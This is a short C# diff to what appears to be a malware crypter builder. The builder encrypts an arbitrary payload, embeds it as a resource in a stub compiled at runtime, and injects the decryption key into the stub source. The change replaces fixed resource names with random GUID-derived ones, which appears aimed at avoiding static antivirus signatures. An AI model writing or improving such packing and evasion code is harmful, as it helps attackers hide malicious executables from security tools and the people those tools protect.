@@ -24,6 +24,8 @@ namespace Crypt
         public bool Build()
         {
             options.encryptionKey = Encryption.GenerateKey();
+            options.resFileName = Guid.NewGuid().ToString().Substring(0, 5);
+            options.resPayloadName = Guid.NewGuid().ToString().Substring(0, 5);
 
             Byte[] encryptedPL = Encrypt(payload, options.encryptionType);
             string stubSrc = AddInfo(Properties.Resources.Stub);
@@ -52,8 +54,21 @@ namespace Crypt
         private string AddInfo(string stubSrc)
         {
             string newStub = stubSrc.Replace("[encryptionKey]", Convert.ToBase64String(options.encryptionKey));
+            newStub = newStub.Replace("[resFileName]", options.resFileName);
+            newStub = newStub.Replace("[resPayloadName]", options.resPayloadName);
 
             return newStub;
+        }
+
+        private string CreateResource(byte[] encryptedPL)
+        {
+            string resourceDir = options.resFileName + ".resources";
+            using (ResourceWriter resourceWriter = new ResourceWriter(resourceDir))
+            {
+                resourceWriter.AddResource(options.resPayloadName, encryptedPL);
+                resourceWriter.Generate();
+            }
+            return resourceDir;
         }
 
         private bool Compile(byte[] encryptedPL, string stubSrc)
@@ -68,18 +83,11 @@ namespace Crypt
             compParams.ReferencedAssemblies.Add("System.Windows.Forms.dll");
             compParams.ReferencedAssemblies.Add("System.Drawing.dll");
 
+            string resourceDir = CreateResource(encryptedPL);
+            compParams.EmbeddedResources.Add(resourceDir);
+
             Dictionary<string, string> providerOptions = new Dictionary<string, string>();
             providerOptions.Add("CompilerVersion", "v2.0");
-
-            //TODO: generate random names for resources
-            //TODO: move to separate function
-            string resourceDir = "enc.resources";
-            using (ResourceWriter resourceWriter = new ResourceWriter(resourceDir))
-            {
-                resourceWriter.AddResource("yaes", encryptedPL);
-                resourceWriter.Generate();
-            }
-            compParams.EmbeddedResources.Add(resourceDir); //TODO: Delete resource file
 
             CompilerResults compResults = new CSharpCodeProvider(providerOptions).CompileAssemblyFromSource(compParams, stubSrc);
 
